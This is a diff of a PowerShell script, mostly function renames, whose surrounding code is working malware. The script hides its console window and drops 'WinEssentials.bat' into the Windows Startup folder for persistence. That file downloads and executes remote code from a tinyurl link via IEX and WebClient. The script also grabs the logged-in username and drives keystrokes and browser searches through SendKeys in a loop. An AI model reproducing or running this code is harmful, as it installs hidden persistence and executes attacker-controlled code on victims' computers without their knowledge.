@@ -7,7 +7,8 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
-function install {
+
+function Install {
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
 New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
@@ -21,24 +22,24 @@ powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.
 "@
 }
 
-install
+Install
 
 $ps = "";
 $id = Get-Random
 $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
 $wshell = New-Object -ComObject wscript.shell;
 
-function type {
- param($string)
- $wshell.SendKeys($string)
+function K {
+ param($String)
+ $wshell.SendKeys($String)
 }
 
-function search {
- param($string)
- type("^t")
- Sleep-Start -m 250;
- type($string)
- type("{ENTER}")
+function S {
+ param($String)
+ k("^t")
+ Sleep-Start -m 250
+ k($String)
+ k("{ENTER}")
 }
 
 while (1) 
